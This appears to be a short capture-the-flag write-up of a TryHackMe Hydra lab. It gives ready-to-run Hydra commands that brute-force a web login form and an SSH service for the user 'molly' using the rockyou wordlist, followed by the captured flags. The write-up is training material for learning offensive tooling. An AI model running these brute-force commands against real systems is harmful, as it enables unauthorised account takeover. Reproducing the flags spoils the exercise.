# 001 Hydra Practical

We know the usernames of the target its **molly**.

![[Pasted image 20220720170450.png]]

Used **rockyou.txt** as the password list.

Molly's webpage is http://10.10.69.162/login.

`hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.69.162 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V`

![[Pasted image 20220720170721.png]]

Found it with one matching record.

![[Pasted image 20220720171438.png]]

Found at her webpage:
**THM{2673a7dd116de68e85c48ec0b1f2612e}**

---

`hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.69.162 -t 4 ssh`

![[Pasted image 20220720171818.png]]

`ssh molly@10.10.69.192`
![[Pasted image 20220720172943.png|700]]

![[Pasted image 20220720173039.png]]

Found at her machine using SSH: **THM{c8eeb0468febbadea859baeb33b2541b}**



